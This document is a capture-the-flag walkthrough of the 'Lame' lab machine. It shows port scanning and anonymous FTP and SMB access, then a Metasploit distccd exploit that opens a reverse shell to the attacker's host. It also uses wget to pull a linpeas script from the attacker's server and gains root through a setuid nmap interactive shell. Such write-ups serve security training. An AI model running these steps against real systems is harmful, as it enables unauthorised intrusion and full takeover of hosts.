# IP Address: 10.10.10.3

## Enumeration.1
Scan for open ports and services.
```
┌──(code㉿kali)-[~]
└─$ sudo nmap -sV -Pn -p- -T 4 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-10 09:41 EST
Nmap scan report for 10.10.10.3
Host is up (0.027s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### FTP 
Check for anonymous FTP login.
```
┌──(code㉿kali)-[~]
└─$ ftp 10.10.10.3                                                                                  
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:code): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```
Anonymous login possible. No files discovered.

### SMB
Check for accessible SMB shares.
```
┌──(code㉿kali)-[~]
└─$ smbmap -u "" -p "" -P 445 -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

```
Multiple shares discovered. We have READ/WRITE access on tmp.

Connect to tmp and enumerate files.
```
┌──(code㉿kali)-[~]
└─$ smbclient -U '%' -N \\\\10.10.10.3\\tmp                                                                          
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 10 10:09:27 2021
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  .ICE-unix                          DH        0  Wed Nov 10 09:39:26 2021
  vmware-root                        DR        0  Wed Nov 10 09:39:52 2021
  .X11-unix                          DH        0  Wed Nov 10 09:39:51 2021
  .X0-lock                           HR       11  Wed Nov 10 09:39:51 2021
  5562.jsvc_up                        R        0  Wed Nov 10 09:40:29 2021
  vgauthsvclog.txt.0                  R     1600  Wed Nov 10 09:39:23 2021
```


### DISTCCD
This service is exploitable by Metasploit module https://www.exploit-db.com/exploits/9915

```
msf6 > search distcc

Matching Modules
================

   #  Name                           Disclosure Date  Rank       Check  Description
   -  ----                           ---------------  ----       -----  -----------
   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/misc/distcc_exec

msf6 > use 0
```


# Exploitation.1 
Set available options.

```
msf6 exploit(unix/misc/distcc_exec) > show options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasp
                                      loit
   RPORT   3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.7       yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Exploit the target.

```
msf6 exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.7:443 
[*] Command shell session 1 opened (10.10.14.7:443 -> 10.10.10.3:48965 ) at 2021-11-10 10:19:25 -0500
```


# Enumeration.2
Find user.txt

![user.txt](https://github.com/codetantrum/walkthroughs/blob/master/Lame/images/Pasted%20image%2020211110102338.png)

Copy Linpeas to target from local web server.
Local:
```
┌──(code㉿kali)-[~]
└─$ sudo service apache2 start
[sudo] password for code: 

┌──(code㉿kali)-[~]
└─$ sudo cp tools/linpeas.sh /var/www/html/peas.sh
```

On target: 
```
daemon@lame:/tmp$ wget http://10.10.14.7/peas.sh
wget http://10.10.14.7/peas.sh
--10:32:50--  http://10.10.14.7/peas.sh
           => `peas.sh'
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 458,110 (447K) [text/x-sh]

100%[====================================>] 458,110        1.18M/s             

10:32:51 (1.18 MB/s) - `peas.sh' saved [458110/458110]

daemon@lame:/tmp$ chmod +x peas.sh
chmod +x peas.sh

```

Linpeas found nmap on the system with the stick bit set. 

# Local Privilege Escalation

Escalate privileges with nmap via GTFObins exploit https://gtfobins.github.io/gtfobins/nmap/

```
daemon@lame:/$ which nmap 
which nmap
/usr/bin/nmap
daemon@lame:/$ ls -l /usr/bin/nmap
ls -l /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
daemon@lame:/$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)

```


# Proof
![root.txt](https://github.com/codetantrum/walkthroughs/blob/master/Lame/images/Pasted%20image%2020211110185307.png)
